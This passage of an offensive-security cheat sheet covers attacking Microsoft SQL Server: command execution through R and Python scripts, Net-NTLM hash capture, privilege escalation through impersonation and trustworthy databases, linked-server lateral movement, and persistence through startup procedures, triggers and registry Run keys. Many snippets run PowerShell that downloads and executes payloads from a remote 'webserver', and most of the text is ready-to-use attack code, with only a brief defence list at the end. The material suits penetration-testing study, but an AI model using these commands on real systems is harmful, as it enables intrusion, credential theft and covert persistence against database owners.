<li><a href="https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart">https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart</a></li>
<li><a href="https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server">https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server</a></li>
<li><a href="https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5">https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5</a></li>
<li><a href="https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server">https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server</a></li>
</ul>
</li>
<li>Executing commands with R:
    <div class="codehilite"><pre><span></span><span class="n">sp_configure</span> <span class="s1">&#39;external scripts enabled&#39;</span>
<span class="k">GO</span>
<span class="k">EXEC</span> <span class="n">sp_execute_external_script</span>
<span class="o">@</span><span class="k">language</span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;R&#39;</span><span class="p">,</span>
<span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe</span>
<span class="s1">/c dir&quot;,intern=T))&#39;</span>
<span class="k">WITH</span> <span class="k">RESULT</span> <span class="k">SETS</span> <span class="p">(([</span><span class="n">cmd_out</span><span class="p">]</span> <span class="nb">text</span><span class="p">));</span>
<span class="k">GO</span>
</pre></div></li>
<li>Grab Net-NTLM hashes with R:
    <div class="codehilite"><pre><span></span><span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;.libPaths(&quot;\\\\testhost\\foo\\bar&quot;);library(&quot;0mgh4x&quot;)&#39;</span>
</pre></div></li>
<li>Using shell instead of system: <a href="https://pastebin.com/zBDnzELT">https://pastebin.com/zBDnzELT</a>
    <div class="codehilite"><pre><span></span><span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s">&#39;OutputDataSet &lt;- data.frame(shell(&quot;dir&quot;,intern=T))&#39;</span>
</pre></div></li>
<li>Executing commands with Python:
    <div class="codehilite"><pre><span></span><span class="k">EXEC</span> <span class="n">sp_execute_external_script</span>
<span class="o">@</span><span class="k">language</span> <span class="o">=</span><span class="n">N</span><span class="s1">&#39;Python&#39;</span><span class="p">,</span>
<span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;import subprocess</span>
<span class="s1">p = subprocess.Popen(&quot;cmd.exe /c whoami&quot;,</span>
<span class="s1">stdout=subprocess.PIPE)</span>
<span class="s1">OutputDataSet = pandas.DataFrame([str(p.stdout.read(),</span>
<span class="s1">&quot;utf-8&quot;)])&#39;</span>
<span class="k">WITH</span> <span class="k">RESULT</span> <span class="k">SETS</span> <span class="p">(([</span><span class="n">cmd_out</span><span class="p">]</span> <span class="n">nvarchar</span><span class="p">(</span><span class="k">max</span><span class="p">)))</span>
</pre></div></li>
<li>PowerUpSQL:
    <div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLOSCmdR</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span> <span class="s2">&quot;powershell -e &lt;base64encodedscript&gt;&quot;</span> <span class="n">-Verbose</span>
<span class="nb">Invoke-SQLOSCmdPython</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span> <span class="s2">&quot;powershell -e &lt;base64encodedscript&gt;&quot;</span> <span class="n">-Verbose</span>
</pre></div></li>
</ul>
<h3 id="registry-autoruns">Registry Autoruns<a class="headerlink" href="#registry-autoruns" title="Permanent link">&para;</a></h3>
<h3 id="file-autoruns">File Autoruns<a class="headerlink" href="#file-autoruns" title="Permanent link">&para;</a></h3>
<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
<h3 id="find-impersonatable-accounts">Find Impersonatable Accounts<a class="headerlink" href="#find-impersonatable-accounts" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a></li>
</ul>
<p><div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="k">distinct</span> <span class="n">b</span><span class="p">.</span><span class="n">name</span>
<span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_permissions</span> <span class="n">a</span>
<span class="k">INNER</span> <span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="n">b</span>
<span class="k">ON</span> <span class="n">a</span><span class="p">.</span><span class="n">grantor_principal_id</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">principal_id</span>
<span class="k">WHERE</span> <span class="n">a</span><span class="p">.</span><span class="n">permission_name</span> <span class="o">=</span> <span class="s1">&#39;IMPERSONATE&#39;</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLAuditPrivImpersonateLogin</span> <span class="n">-Username</span> <span class="n">un</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">dbname</span> <span class="n">-Verbose</span>
</pre></div></p>
<h3 id="execute-as">Execute As<a class="headerlink" href="#execute-as" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql">https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql</a></li>
</ul>
<p><div class="codehilite"><pre><span></span><span class="k">EXECUTE</span> <span class="k">AS</span> <span class="n">LOGIN</span> <span class="o">=</span> <span class="s1">&#39;dbadmin&#39;</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="k">SYSTEM_USER</span>
<span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span>

<span class="k">EXECUTE</span> <span class="k">AS</span> <span class="n">LOGIN</span> <span class="o">=</span> <span class="s1">&#39;dbadmin&#39;</span>
<span class="k">SELECT</span> <span class="k">SYSTEM_USER</span>
<span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span>
<span class="k">SELECT</span> <span class="n">ORIGINAL_LOGIN</span><span class="p">()</span>

<span class="k">EXECUTE</span> <span class="k">AS</span> <span class="n">LOGIN</span> <span class="o">=</span> <span class="s1">&#39;sa&#39;</span>
<span class="k">SELECT</span> <span class="k">SYSTEM_USER</span>
<span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span>
<span class="k">SELECT</span> <span class="n">ORIGINAL_LOGIN</span><span class="p">()</span>
</pre></div></p>
<h3 id="trustworthy-databases">Trustworthy Databases<a class="headerlink" href="#trustworthy-databases" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property">https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property</a></li>
<li><a href="http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/">http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/</a></li>
</ul>
<ul>
<li><code class="codehilite"><span class="n">is_trustworthy_off</span></code> by default (Only a sysadmin can change).</li>
<li>When <code class="codehilite"><span class="k">off</span></code> impersonated users will only have database-scope permissions.</li>
<li>When <code class="codehilite"><span class="k">on</span></code> impersonated users can perform actions with server level permissions.</li>
<li>Allows writing procedures that can execute code with server level permission.</li>
</ul>
<ul>
<li>If <code class="codehilite"><span class="n">is_trustworthy_on</span></code> and if a <code class="codehilite"><span class="n">sysadmin</span></code> (not necessarily <code class="codehilite"><span class="n">sa</span></code>) is owner of the database, it is possible for the database owner (a user with <code class="codehilite"><span class="n">db_owner</span></code>) to elevate privileges to <code class="codehilite"><span class="n">sysadmin</span></code>.</li>
</ul>
<p><strong>Discover Trustworthy Databases</strong></p>
<p><div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">as</span> <span class="n">database_name</span><span class="p">,</span> <span class="n">SUSER_NAME</span><span class="p">(</span><span class="n">owner_sid</span><span class="p">)</span> <span class="k">AS</span> <span class="n">database_owner</span><span class="p">,</span> <span class="n">is_trustworthy_on</span> <span class="k">AS</span> <span class="n">TRUSTWORTHY</span> 
<span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="n">databases</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLAudit</span> <span class="n">-Instance</span> <span class="n">instance-name</span> <span class="n">-Verbose</span> <span class="p">|</span> <span class="nb">Out-GridView</span>
<span class="nb">Invoke-SQLAuditPrivTrustworthy</span> <span class="n">-Instance</span> <span class="n">instance-name</span> <span class="n">-Verbose</span>
</pre></div></p>
<p><strong>Exploitation</strong></p>
<ul>
<li>Add <code class="codehilite"><span class="n">sysadmin</span></code> to <code class="codehilite"><span class="n">myuser</span></code>:
<div class="codehilite"><pre><span></span><span class="k">EXECUTE</span> <span class="k">AS</span> <span class="k">USER</span> <span class="o">=</span> <span class="s1">&#39;dbo&#39;</span>
<span class="k">SELECT</span> <span class="k">system_user</span>
<span class="k">EXEC</span> <span class="n">sp_addsrvrolemember</span> <span class="s1">&#39;example.com\myuser&#39;</span><span class="p">,</span><span class="s1">&#39;sysadmin&#39;</span>
</pre></div></li>
</ul>
<h3 id="public-to-service-account">Public to Service Account<a class="headerlink" href="#public-to-service-account" title="Permanent link">&para;</a></h3>
<p><strong>UNC Path Injection</strong></p>
<ul>
<li>Capture Net-NTLM (also known as NTLMv1/v2) hashes</li>
<li>Stored procedures like <code class="codehilite"><span class="n">xp_dirtree</span></code> and <code class="codehilite"><span class="n">xp_fileexist</span></code> can be used to capture Net-NTLM hashes</li>
<li>UNC Path Injection cheatsheet: <a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e</a></li>
</ul>
<div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLUncPathInjection</span> <span class="n">-Verbose</span> <span class="n">-CaptureIp</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">11</span>
</pre></div>

<h3 id="service-account-to-system">Service Account to System<a class="headerlink" href="#service-account-to-system" title="Permanent link">&para;</a></h3>
<p><strong>Rotten Potato</strong></p>
<ul>
<li><a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</a></li>
<li>Trick the "NT AUTHORITY\SYSTEM" account into authenticating via NTLM to a TCP endpoint attacker control.</li>
<li>Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account</li>
<li>Impersonate the token we have just negotiated.</li>
<li>Usable only if attackers current account has the privilege to impersonate security tokens.</li>
</ul>
<p><strong>Extracting service account credentials from LSA Secrets and/or memory</strong></p>
<p><strong>Token Impersonation for the SQL Server service</strong></p>
<p><strong>Single user mode</strong></p>
<h2 id="lateral-movement">Lateral Movement<a class="headerlink" href="#lateral-movement" title="Permanent link">&para;</a></h2>
<h3 id="domain-user-accounts">Domain User accounts<a class="headerlink" href="#domain-user-accounts" title="Permanent link">&para;</a></h3>
<ul>
<li>SQL server allows Domain user logins (it a part of the domain trust)</li>
<li>Once domain user access is present, enumerate privileges it has on SQL servers in the domain</li>
<li>After gaining shell access to the user (command execution) following can be done:<ul>
<li>Check if current user has access to SQL Servers in domain: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SQLInstanceDomain</span> <span class="o">|</span> <span class="k">Get</span><span class="o">-</span><span class="n">SQLServerInfo</span> <span class="o">-</span><span class="k">Verbose</span></code></li>
<li>For alternative credentials: <code class="codehilite"><span class="n">runas</span> <span class="o">/</span><span class="n">noprofile</span> <span class="o">/</span><span class="n">netonly</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="o">&lt;</span><span class="k">domain</span><span class="err">\</span><span class="n">username</span><span class="o">&gt;</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span></code></li>
<li>A user with <code class="codehilite"><span class="k">public</span></code> access can be used to enumerate domain accounts and groups in the forest and other trusted forests: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SQLFuzzDomainAccount</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">instance</span> <span class="o">-</span><span class="n">StartId</span> <span class="mi">500</span> <span class="o">-</span><span class="n">EndId</span> <span class="mi">2000</span> <span class="o">-</span><span class="k">Verbose</span></code></li>
</ul>
</li>
<li>If local admin rights are present, dump credentials.</li>
<li>References:<ul>
<li><a href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/</a></li>
</ul>
</li>
</ul>
<h3 id="database-links">Database Links<a class="headerlink" href="#database-links" title="Permanent link">&para;</a></h3>
<ul>
<li>Allows a SQL Server to access external data sources (SQL Servers, OLE DB)</li>
<li>If SQL Servers are linked:<ul>
<li>Can execute stored procedures</li>
<li>Work across SQL server versions and forests</li>
</ul>
</li>
<li>References:<ul>
<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine">https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine</a></li>
<li><a href="http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html">http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html</a></li>
</ul>
</li>
<li>Search for linked databases: <code class="codehilite"><span class="k">select</span> <span class="o">-</span> <span class="k">from</span> <span class="n">master</span><span class="p">..</span><span class="n">sysservers</span></code> <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SQLServerLink</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">instance</span> <span class="o">-</span><span class="k">Verbose</span></code></li>
<li>Run queries on linked databases: <code class="codehilite"><span class="k">select</span> <span class="o">-</span> <span class="k">from</span> <span class="n">openquery</span><span class="p">(</span><span class="ss">&quot;instance&quot;</span><span class="p">,</span><span class="s1">&#39;select - frommaster..sysservers&#39;</span><span class="p">)</span></code></li>
<li>Run queries on chain of linked databases:
    <div class="codehilite"><pre><span></span><span class="k">select</span> <span class="o">-</span> <span class="k">from</span> <span class="n">openquery</span><span class="p">(</span><span class="ss">&quot;inatance1&quot;</span><span class="p">,</span><span class="s1">&#39;select - from openquery(&quot;instance2&quot;,&#39;&#39;select - from master..sysservers&#39;&#39;)&#39;</span><span class="p">)</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLServerLinkCrawl</span> <span class="n">-Instance</span> <span class="n">instance1</span> <span class="n">-Verbose</span>
</pre></div></li>
<li>If <code class="codehilite"><span class="n">rpcout</span></code> is enabled for all links (disabled by default), <code class="codehilite"><span class="n">xp_cmdshell</span></code> can be enabled using:
    <div class="codehilite"><pre><span></span><span class="k">EXECUTE</span><span class="p">(</span><span class="s1">&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;reconfigure;&#39;</span><span class="p">)</span> <span class="k">AT</span> <span class="ss">&quot;instance2&quot;</span><span class="p">)</span>
</pre></div></li>
<li>Command execution with linked databases:
    <div class="codehilite"><pre><span></span><span class="k">select</span> <span class="o">-</span> <span class="k">from</span> <span class="n">openquery</span><span class="p">(</span><span class="ss">&quot;instance1&quot;</span><span class="p">,</span><span class="s1">&#39;select - from</span>
<span class="s1">openquery(&quot;instance2&quot;,&#39;&#39;select - from openquery(&quot;instance3&quot;,&#39;&#39;&#39;&#39;select @@version as version;exec master..xp_cmdshell &quot;cmd /c calc.exe&quot;&#39;&#39;&#39;&#39;)&#39;&#39;)&#39;</span><span class="p">)</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLServerLinkCrawl</span> <span class="n">-Instance</span> <span class="n">instance1</span> <span class="n">-Query</span> <span class="s2">&quot;exec master..xp_cmdshell &#39;cmd /c calc.exe&#39;&quot;</span><span class="n">-Verbose</span>
</pre></div></li>
<li>Decrypting Database Link Server Passwords: <a href="https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/">https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/</a></li>
</ul>
<h2 id="persistence">Persistence<a class="headerlink" href="#persistence" title="Permanent link">&para;</a></h2>
<h3 id="startup-stored-procedures">Startup stored procedures<a class="headerlink" href="#startup-stored-procedures" title="Permanent link">&para;</a></h3>
<ul>
<li><code class="codehilite"><span class="n">sysadmin</span></code> privileges are required to mark proc for automated execution</li>
<li>Owned only by <code class="codehilite"><span class="n">sa</span></code></li>
<li>Must be in the <code class="codehilite"><span class="n">master</span></code> database</li>
<li>Cannot have input or output parameters</li>
<li>Gets executed with <code class="codehilite"><span class="n">sysadmin</span></code> privileges</li>
<li>Executed when SQL Server restart</li>
<li>References:<ul>
<li><a href="https://technet.microsoft.com/en-us/library/ms191129(v=sql.105).aspx">https://technet.microsoft.com/en-us/library/ms191129(v=sql.105).aspx</a></li>
<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql</a></li>
<li><a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></li>
</ul>
</li>
<li>Create:
    <div class="codehilite"><pre><span></span><span class="n">USE</span> <span class="n">master</span>
<span class="k">GO</span>

<span class="k">CREATE</span> <span class="k">PROCEDURE</span> <span class="n">sp_autops</span>
<span class="k">AS</span>
<span class="k">EXEC</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">&#39;powershell -C &quot;iex (new-object System.Net.WebClient).DownloadString(&#39;&#39;http://webserver/payload.ps1&#39;&#39;)&quot;&#39;</span>
<span class="k">GO</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="k">EXEC</span> <span class="n">sp_procoption</span> <span class="o">@</span><span class="n">ProcName</span> <span class="o">=</span> <span class="s1">&#39;sp_autops&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">OptionName</span> <span class="o">=</span> <span class="s1">&#39;startup&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">OptionValue</span> <span class="o">=</span> <span class="s1">&#39;on&#39;</span><span class="p">;</span>
</pre></div></li>
<li>List:
    <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="k">FROM</span> <span class="n">sysobjects</span> <span class="k">WHERE</span> <span class="k">type</span> <span class="o">=</span> <span class="s1">&#39;P&#39;</span> <span class="k">AND</span> <span class="n">OBJECTPROPERTY</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="s1">&#39;ExecIsStartUp&#39;</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</pre></div></li>
</ul>
<h3 id="triggers">Triggers<a class="headerlink" href="#triggers" title="Permanent link">&para;</a></h3>
<ul>
<li>References:<ul>
<li><a href="https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql">https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql</a></li>
</ul>
</li>
</ul>
<h4 id="data-definition-language-ddl-triggers">Data Definition Language (DDL) Triggers<a class="headerlink" href="#data-definition-language-ddl-triggers" title="Permanent link">&para;</a></h4>
<ul>
<li>Execute under the context of the user that calls the trigger</li>
<li>References:<ul>
<li><a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></li>
<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers</a></li>
<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups</a>
  <div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="k">Trigger</span> <span class="p">[</span><span class="n">persistence_ddl_1</span><span class="p">]</span>
<span class="k">ON</span> <span class="k">ALL</span> <span class="n">Server</span> <span class="c1">-- or DATABASE</span>
<span class="k">FOR</span> <span class="n">DDL_LOGIN_EVENTS</span> <span class="c1">-- See the docs below for events and event groups</span>
<span class="k">AS</span>
<span class="k">EXEC</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">&#39;powershell -C &quot;iex (new-object System.Net.WebClient).DownloadString(&#39;&#39;http://webserver/payload.ps1&#39;</span><span class="err">&#39;</span><span class="p">)</span>
<span class="k">GO</span>
</pre></div></li>
</ul>
</li>
</ul>
<h4 id="data-manipulation-language-dml-triggers">Data Manipulation Language (DML) Triggers<a class="headerlink" href="#data-manipulation-language-dml-triggers" title="Permanent link">&para;</a></h4>
<ul>
<li>Execute under the context of the user that calls the trigger</li>
<li>User should have privilages to do the task in the trigger</li>
<li>References:<ul>
<li><a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></li>
<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers</a>
  <div class="codehilite"><pre><span></span><span class="n">USE</span> <span class="n">master</span>
<span class="k">GRANT</span> <span class="n">IMPERSONATE</span> <span class="k">ON</span> <span class="n">LOGIN</span><span class="p">::</span><span class="n">sa</span> <span class="k">to</span> <span class="p">[</span><span class="k">Public</span><span class="p">];</span>
<span class="n">USE</span> <span class="n">testdb</span>
<span class="k">CREATE</span> <span class="k">TRIGGER</span> <span class="p">[</span><span class="n">persistence_dml_1</span><span class="p">]</span>
<span class="k">ON</span> <span class="n">testdb</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">datatable</span>
<span class="k">FOR</span> <span class="k">INSERT</span><span class="p">,</span> <span class="k">UPDATE</span><span class="p">,</span> <span class="k">DELETE</span> <span class="k">AS</span>
<span class="k">EXECUTE</span> <span class="k">AS</span> <span class="n">LOGIN</span> <span class="o">=</span> <span class="s1">&#39;sa&#39;</span>
<span class="k">EXEC</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">&#39;powershell -C &quot;iex (new-object System.Net.WebClient).DownloadString(&#39;&#39;http://webserver/payload.ps1&#39;</span><span class="err">&#39;</span><span class="p">)</span>
<span class="k">GO</span>
</pre></div></li>
</ul>
</li>
</ul>
<h4 id="logon-triggers">Logon Triggers<a class="headerlink" href="#logon-triggers" title="Permanent link">&para;</a></h4>
<ul>
<li>Ideal for triggering with a logon failure of a low-privilege user.</li>
<li>References:<ul>
<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers</a>
  <div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="k">Trigger</span> <span class="p">[</span><span class="n">persistence_logon_1</span><span class="p">]</span>
<span class="k">ON</span> <span class="k">ALL</span> <span class="n">SERVER</span> <span class="k">WITH</span> <span class="k">EXECUTE</span> <span class="k">AS</span> <span class="s1">&#39;sa&#39;</span>
<span class="k">FOR</span> <span class="n">LOGON</span>
<span class="k">AS</span>
<span class="k">BEGIN</span>
<span class="k">IF</span> <span class="n">ORIGINAL_LOGIN</span><span class="p">()</span> <span class="o">=</span> <span class="s1">&#39;testuser&#39;</span>
<span class="k">EXEC</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">&#39;powershell -C &quot;iex (new-object</span>
<span class="s1">System.Net.WebClient).DownloadString(&#39;&#39;http://webserver/payload.ps1&#39;&#39;)&quot;</span>
<span class="s1">&#39;</span>
<span class="k">END</span><span class="p">;</span>
</pre></div></li>
</ul>
</li>
<li>List all Triggers
    <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_triggers</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLTriggerDdl</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Verbose</span>
</pre></div></li>
</ul>
<h3 id="registry-keys">Registry keys<a class="headerlink" href="#registry-keys" title="Permanent link">&para;</a></h3>
<p><strong><code class="codehilite"><span class="n">xp_regwrite</span></code></strong></p>
<ul>
<li>Needs <code class="codehilite"><span class="n">sysadmin</span></code></li>
</ul>
<div class="codehilite"><pre><span></span><span class="k">EXEC</span> <span class="n">xp_regwrite</span>
<span class="o">@</span><span class="n">rootkey</span> <span class="o">=</span> <span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span><span class="p">,</span>
<span class="o">@</span><span class="k">key</span> <span class="o">=</span> <span class="s1">&#39;Software\Microsoft\Windows\CurrentVersion\Run&#39;</span><span class="p">,</span>
<span class="o">@</span><span class="n">value_name</span> <span class="o">=</span> <span class="s1">&#39;SQLServerUpdate&#39;</span><span class="p">,</span>
<span class="o">@</span><span class="k">type</span> <span class="o">=</span> <span class="s1">&#39;REG_SZ&#39;</span><span class="p">,</span>
<span class="o">@</span><span class="n">value</span> <span class="o">=</span> <span class="s1">&#39;powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString(&quot;http://webserver/evil.ps1&quot;)&#39;</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="nb">Get-SQLPersistRegDebugger</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-FileName</span> <span class="n">utilman</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Command</span> <span class="s1">&#39;c:\windows\system32\cmd.exe&#39;</span> <span class="n">-Verbose</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="nb">Get-SQLPersistRegRun</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Name</span> <span class="n">SQLUpdate</span> <span class="n">-Command</span> <span class="s1">&#39;powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString(&quot;http://webserver/evil.ps1&quot;)&#39;</span> <span class="n">-Verbose</span>
</pre></div>

<p><strong><code class="codehilite"><span class="n">xp_regread</span></code></strong></p>
<ul>
<li>Limited read for <code class="codehilite"><span class="k">public</span></code> role</li>
<li>References:<ul>
<li><a href="https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/">https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/</a>
  <div class="codehilite"><pre><span></span><span class="k">DECLARE</span> <span class="o">@</span><span class="n">Reg_Value</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
<span class="k">EXECUTE</span> <span class="n">xp_regread</span> <span class="s1">&#39;HKEY_LOCAL_MACHINE&#39;</span><span class="p">,</span><span class="s1">&#39;SOFTWARE\Microsoft\WindowsNT\CurrentVersion\CurrentVersion&#39;</span><span class="p">,</span><span class="err">‘</span><span class="n">ProductName</span><span class="err">&#39;</span><span class="p">,</span>
<span class="o">@</span><span class="n">Reg_Value</span> <span class="k">OUTPUT</span>
<span class="k">SELECT</span> <span class="o">@</span><span class="n">Reg_Value</span>
</pre></div></li>
</ul>
</li>
<li>Read auto-login password:
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLRecoverPwAutoLogon</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Verbose</span>
</pre></div></li>
</ul>
<p><strong><code class="codehilite"><span class="n">xp_regdeletekey</span></code></strong></p>
<ul>
<li>Needs <code class="codehilite"><span class="n">sysadmin</span></code></li>
<li>References:<ul>
<li><a href="https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-is-denied-error-message-when-a-query-cal">https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-is-denied-error-message-when-a-query-cal</a></li>
</ul>
</li>
</ul>
<h2 id="defence">Defence<a class="headerlink" href="#defence" title="Permanent link">&para;</a></h2>
<ul>
<li>Audit links, trusts, privileges and credentials.</li>
<li>Service Accounts for databases should not be high privilege domain account.</li>
<li>Known dangerous Stored Procedures are disabled.</li>
<li>Use audit features to log interesting events.</li>
<li>Monitor the logs (<code class="codehilite"><span class="n">Management</span> <span class="n">Studio</span> <span class="o">-&gt;</span> <span class="n">Management</span> <span class="o">-&gt;</span> <span class="k">SQL</span> <span class="n">Server</span> <span class="n">Logs</span></code>)</li>
